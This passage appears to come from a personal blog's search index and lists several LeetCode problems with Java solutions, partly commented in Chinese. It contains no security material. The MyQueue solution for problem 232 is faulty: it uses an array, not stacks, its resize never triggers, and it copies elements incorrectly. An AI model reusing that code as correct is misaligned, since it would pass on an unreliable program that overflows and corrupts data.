      <url>/wiki/2017/10/30/Leetcode-240-Search-a-2D-Matrix-II/</url>
      <content type="html"><![CDATA[<p>Write an efficient algorithm that searches for a value in an $m x\times n$ matrix. This matrix has the following properties:</p>
<ul>
<li>Integers in each row are sorted in ascending from left to right.</li>
<li>Integers in each column are sorted in ascending from top to bottom.</li>
</ul>
<p>Example:</p>
<p>Consider the following matrix:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  [1,   4,  7, 11, 15],</span><br><span class="line">  [2,   5,  8, 12, 19],</span><br><span class="line">  [3,   6,  9, 16, 22],</span><br><span class="line">  [10, 13, 14, 17, 24],</span><br><span class="line">  [18, 21, 23, 26, 30]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>Given target = <code>5</code>, return <code>true</code>.</p>
<p>Given target = <code>20</code>, return <code>false</code>.</p>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Binary Search </tag>
            
            <tag> Divide and Conquer </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[237. Delete Node in a Linked List]]></title>
      <url>/wiki/2017/10/30/Leetcode-237-Delete-Node-in-a-Linked-List/</url>
      <content type="html"><![CDATA[<p>Write a function to delete a node (except the tail) in a singly linked list, given only access to that node.</p>
<p>Given linked list – head = [4,5,1,9], which looks like following:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4 -&gt; 5 -&gt; 1 -&gt; 9</span><br></pre></td></tr></table></figure>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: head = [4,5,1,9], node = 5</span><br><span class="line">Output: [4,1,9]</span><br><span class="line">Explanation: You are given the second node with value 5, the linked list</span><br><span class="line">             should become 4 -&gt; 1 -&gt; 9 after calling your function.</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: head = [4,5,1,9], node = 1</span><br><span class="line">Output: [4,5,9]</span><br><span class="line">Explanation: You are given the third node with value 1, the linked list</span><br><span class="line">             should become 4 -&gt; 5 -&gt; 9 after calling your function.</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li>The linked list will have at least two elements.</li>
<li>All of the nodes’ values will be unique.</li>
<li>The given node will not be the tail and it will always be a valid node of the linked list.</li>
<li>Do not return anything from your function.</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Write a function to delete a node (except the tail) in a singly linked list,</span></span><br><span class="line"><span class="comment"> * given only access to that node.</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/delete-node-in-a-linked-list/description/</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Q237DeleteNodeInALinkedList</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * we have to replace the value of the node we want to</span></span><br><span class="line"><span class="comment">     * delete with the value in the node after it,</span></span><br><span class="line"><span class="comment">     * and then delete the node after it.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteNode</span><span class="params">(ListNode node)</span> </span>&#123;</span><br><span class="line">        node.val = node.next.val;</span><br><span class="line">        node.next = node.next.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Linked List </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[236. Lowest Common Ancestor of a Binary Tree]]></title>
      <url>/wiki/2017/10/30/Leetcode-236-Lowest-Common-Ancestor-of-a-Binary-Tree/</url>
      <content type="html"><![CDATA[<p>Given a binary tree, find the lowest common ancestor (LCA) of two given nodes in the tree.</p>
<p>According to the definition of LCA on Wikipedia: “The lowest common ancestor is defined between two nodes p and q as the lowest node in T that has both p and q as descendants (where we allow a node to be a descendant of itself).”</p>
<p>Given the following binary tree:  root = [3,5,1,6,2,0,8,null,null,7,4]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">     _______3______</span><br><span class="line">    /              \</span><br><span class="line"> ___5__          ___1__</span><br><span class="line">/      \        /      \</span><br><span class="line">6      _2       0       8</span><br><span class="line">      /  \</span><br><span class="line">      7   4</span><br></pre></td></tr></table></figure>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 1</span><br><span class="line">Output: 3</span><br><span class="line">Explanation: The LCA of of nodes 5 and 1 is 3.</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 4</span><br><span class="line">Output: 5</span><br><span class="line">Explanation: The LCA of nodes 5 and 4 is 5, since a node can be a descendant of itself</span><br><span class="line">             according to the LCA definition.</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li>All of the nodes’ values will be unique.</li>
<li>p and q are different and both values will exist in the binary tree.</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[235. Lowest Common Ancestor of a Binary Search Tree]]></title>
      <url>/wiki/2017/10/30/Leetcode-235-Lowest-Common-Ancestor-of-a-Binary-Search-Tree/</url>
      <content type="html"><![CDATA[<p>Given a binary search tree (BST), find the <a href="https://en.wikipedia.org/wiki/Lowest_common_ancestor">lowest common ancestor (LCA)</a> of two given nodes in the BST.</p>
<p>According to the definition of LCA on Wikipedia: </p>
<blockquote>
<p>The lowest common ancestor is defined between two nodes p and q as the lowest node in T that has both p and q as descendants (where we allow a node to be a descendant of itself).</p>
</blockquote>
<p>Given binary search tree:  root = [6,2,8,0,4,7,9,null,null,3,5]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">     _______6______</span><br><span class="line">    /              \</span><br><span class="line"> ___2__          ___8__</span><br><span class="line">/      \        /      \</span><br><span class="line">0      _4       7       9</span><br><span class="line">      /  \</span><br><span class="line">      3   5</span><br></pre></td></tr></table></figure>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 8</span><br><span class="line">Output: 6</span><br><span class="line">Explanation: The LCA of nodes 2 and 8 is 6.</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 4</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: The LCA of nodes 2 and 4 is 2, since a node can be a descendant of itself </span><br><span class="line">             according to the LCA definition.</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li>All of the nodes’ values will be unique.</li>
<li>p and q are different and both values will exist in the BST.</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>最近公共祖先，有两层主要含义：第一，必须是公共祖先，第二，节点所在的高度要是最高的。</p>
<p>那么怎么寻找最近公共祖先呢？注意，题目的限定————二叉搜索树，这里要用到二叉搜索树的性质。</p>
<ul>
<li>如果p, q都比根节点小，则在左子树中递归查找LCA。</li>
<li>如果p, q都比根节点大，则在右子树中递归查找LCA。</li>
<li>如果p, q一个比根节点大，一个比根节点小，或有一个等于根节点，则根节点为LCA。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (p.val &lt; root.val &amp;&amp; q.val &lt; root.val) <span class="keyword">return</span> lowestCommonAncestor(root.left, p, q);</span><br><span class="line">    <span class="keyword">if</span> (p.val &gt; root.val &amp;&amp; q.val &gt; root.val) <span class="keyword">return</span> lowestCommonAncestor(root.right, p, q);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[234. Palindrome Linked List]]></title>
      <url>/wiki/2017/10/30/Leetcode-234-Palindrome-Linked-List/</url>
      <content type="html"><![CDATA[<p>Given a singly linked list, determine if it is a palindrome.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;2</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;2-&gt;2-&gt;1</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure>
<p>Follow up:<br>Could you do it in O(n) time and O(1) space?</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leetcode;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * An Palindrome is a sequence of characters</span></span><br><span class="line"><span class="comment"> * which reads the same backward or forward.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 这道题目第一让人联想到的就是Leetcode Q206ReverseLinkedList，</span></span><br><span class="line"><span class="comment"> * 即将链表反转，然后一一比对。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 在这里，只要将链表的后半部分反转，然后利用两个指针分别指向链表首尾，</span></span><br><span class="line"><span class="comment"> * 依次向前/向后移动指针，直到到达中点。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 我觉得这里的难点主要是要考虑一些特殊情况，比如说只有2，3个元素的这种链表。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Q234PalindromeLinkedList</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isPalindrome</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((head == <span class="keyword">null</span>) || (head.next == <span class="keyword">null</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// find lenth</span></span><br><span class="line">        <span class="keyword">int</span> len;</span><br><span class="line">        ListNode pos = head;</span><br><span class="line">        <span class="keyword">for</span> (len = <span class="number">0</span>; pos != <span class="keyword">null</span>; len++) &#123;</span><br><span class="line">            pos = pos.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// find middle node</span></span><br><span class="line">        ListNode mid = head;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (len-<span class="number">1</span>)/<span class="number">2</span>; i++)</span><br><span class="line">            mid = mid.next;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// reverse</span></span><br><span class="line">        ListNode cur = mid.next;</span><br><span class="line">        <span class="keyword">if</span> (cur.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">            ListNode next;</span><br><span class="line">            <span class="keyword">for</span> (pos = mid; cur.next != <span class="keyword">null</span>; ) &#123;</span><br><span class="line">                next = cur.next;</span><br><span class="line">                cur.next = pos;</span><br><span class="line">                pos = cur;</span><br><span class="line">                cur = next;</span><br><span class="line">            &#125;</span><br><span class="line">            cur.next = pos;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            cur.next = mid;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ListNode tail = cur;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// compare the first and second half nodes</span></span><br><span class="line">        <span class="keyword">while</span> (tail != mid) &#123;</span><br><span class="line">            <span class="keyword">if</span> (tail.val != head.val) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            tail = tail.next;</span><br><span class="line">            head = head.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>  <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 寻找mid和tail时其实不用计算链表长度</span></span><br><span class="line"><span class="comment">     * 只要有两个指针，一块一慢，遍历链表即可</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isPalindromeUsingQuickFindMidTail</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((head == <span class="keyword">null</span>) || (head.next == <span class="keyword">null</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// A trick to quickly find mid and tail of linked list</span></span><br><span class="line">        ListNode mid = head, tail = head.next;</span><br><span class="line">        <span class="keyword">while</span> ((tail != <span class="keyword">null</span>) &amp;&amp; (tail.next != <span class="keyword">null</span>)) &#123;</span><br><span class="line">            mid = mid.next;</span><br><span class="line">            tail = tail.next.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// reverse</span></span><br><span class="line">        ListNode cur = mid.next, pos, next;</span><br><span class="line">        <span class="keyword">if</span> (cur.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (pos = mid; cur.next != <span class="keyword">null</span>; ) &#123;</span><br><span class="line">                next = cur.next;</span><br><span class="line">                cur.next = pos;</span><br><span class="line">                pos = cur;</span><br><span class="line">                cur = next;</span><br><span class="line">            &#125;</span><br><span class="line">            cur.next = pos;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            cur.next = mid;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        tail = cur;</span><br><span class="line">        <span class="comment">// compare the first and second half nodes</span></span><br><span class="line">        <span class="keyword">while</span> (tail != mid) &#123;</span><br><span class="line">            <span class="keyword">if</span> (tail.val != head.val) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            tail = tail.next;</span><br><span class="line">            head = head.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>  <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Two Pointers </tag>
            
            <tag> Linked List </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[232. Implement Queue using Stacks]]></title>
      <url>/wiki/2017/10/30/Leetcode-232-Implement-Queue-using-Stacks/</url>
      <content type="html"><![CDATA[<p>Implement the following operations of a queue using stacks.</p>
<ul>
<li>push(x) – Push element x to the back of queue.</li>
<li>pop() – Removes the element from in front of queue.</li>
<li>peek() – Get the front element.</li>
<li>empty() – Return whether the queue is empty.</li>
</ul>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MyQueue queue = new MyQueue();</span><br><span class="line"></span><br><span class="line">queue.push(1);</span><br><span class="line">queue.push(2);  </span><br><span class="line">queue.peek();  // returns 1</span><br><span class="line">queue.pop();   // returns 1</span><br><span class="line">queue.empty(); // returns false</span><br></pre></td></tr></table></figure>
<p>Notes:</p>
<p>You must use only standard operations of a stack – which means only push to top, peek/pop from top, size, and is empty operations are valid.<br>Depending on your language, stack may not be supported natively. You may simulate a stack by using a list or deque (double-ended queue), as long as you use only standard operations of a stack.<br>You may assume that all operations are valid (for example, no pop or peek operations will be called on an empty queue).</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyQueue</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] items;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> head;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> tail;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> len;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyQueue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        items = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">        head = <span class="number">0</span>;</span><br><span class="line">        tail = <span class="number">0</span>;</span><br><span class="line">        len = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Push element x to the back of queue. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        items[tail++] = x;</span><br><span class="line">        <span class="keyword">if</span> (tail == size) &#123;</span><br><span class="line">            resize(<span class="number">2</span>*size);</span><br><span class="line">        &#125;</span><br><span class="line">        len++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Removes the element from in front of queue and returns that element. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        len--;</span><br><span class="line">        <span class="keyword">return</span> items[head++];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Get the front element. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">peek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> items[head];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Returns whether the queue is empty. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (len==<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">resize</span><span class="params">(<span class="keyword">int</span> newSize)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> newItems[] = <span class="keyword">new</span> <span class="keyword">int</span>[newSize];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = head, j = <span class="number">0</span>; i &lt;= tail; i++, j++) &#123;</span><br><span class="line">            newItems[i] = items[j];</span><br><span class="line">        &#125;</span><br><span class="line">        head = <span class="number">0</span>;</span><br><span class="line">        tail = items.length;</span><br><span class="line">        size = newSize;</span><br><span class="line">        items = newItems;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MyQueue object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MyQueue obj = new MyQueue();</span></span><br><span class="line"><span class="comment"> * obj.push(x);</span></span><br><span class="line"><span class="comment"> * int param_2 = obj.pop();</span></span><br><span class="line"><span class="comment"> * int param_3 = obj.peek();</span></span><br><span class="line"><span class="comment"> * boolean param_4 = obj.empty();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Stack </tag>
            
            <tag> Design </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[230. Kth Smallest Element in a BST]]></title>
      <url>/wiki/2017/10/30/Leetcode-230-Kth-Smallest-Element-in-a-BST/</url>
      <content type="html"><![CDATA[<p>Given a binary search tree, write a function <code>kthSmallest</code> to find the <strong>k</strong>th smallest element in it.</p>
<p>Note:<br>You may assume $k$ is always valid, 1 ≤ k ≤ BST’s total elements.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: root = [3,1,4,null,2], k = 1</span><br><span class="line">   3</span><br><span class="line">  / \</span><br><span class="line"> 1   4</span><br><span class="line">  \</span><br><span class="line">   2</span><br><span class="line">Output: 1</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Input: root = [5,3,6,2,4,null,null,1], k = 3</span><br><span class="line">       5</span><br><span class="line">      / \</span><br><span class="line">     3   6</span><br><span class="line">    / \</span><br><span class="line">   2   4</span><br><span class="line">  /</span><br><span class="line"> 1</span><br><span class="line">Output: 3</span><br></pre></td></tr></table></figure>
<p>Follow up:<br>What if the BST is modified (insert/delete operations) often and you need to find the kth smallest frequently? How would you optimize the kthSmallest routine?</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目要求我们求出第k个最小的节点。既然是二叉搜索树，由于二叉搜索树的中序遍历(94. Binary Tree Inorder Traversal)的结果是递增序列。所以最直接的方法就是进行二叉搜索树的中序遍历，当遍历到第k个节点时，返回该节点。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">kthSmallest</span><span class="params">(TreeNode root, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">    TreeNode cur = root;</span><br><span class="line">    <span class="keyword">int</span> curk = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (cur != <span class="keyword">null</span> || !stack.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">while</span> (cur != <span class="keyword">null</span>) &#123;</span><br><span class="line">            stack.push(cur);</span><br><span class="line">            cur = cur.left;</span><br><span class="line">        &#125;</span><br><span class="line">       